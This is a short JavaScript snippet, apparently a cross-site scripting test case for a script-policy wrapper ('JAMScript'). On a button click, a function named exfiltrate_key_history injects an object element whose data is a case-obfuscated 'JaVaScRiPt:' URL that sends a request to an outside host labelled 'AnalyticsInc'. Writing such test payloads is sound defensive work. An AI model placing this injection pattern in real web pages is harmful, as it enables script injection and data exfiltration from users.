function exfiltrate_key_history() {
  var URL = 'Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss3",true);xmlhttp.send(null);\')()';
  var script = document.createElement("object");
  script.data = "JaVaScRiPt:" + URL;
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAMScript.call(v0.appendChild, v0, [script]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

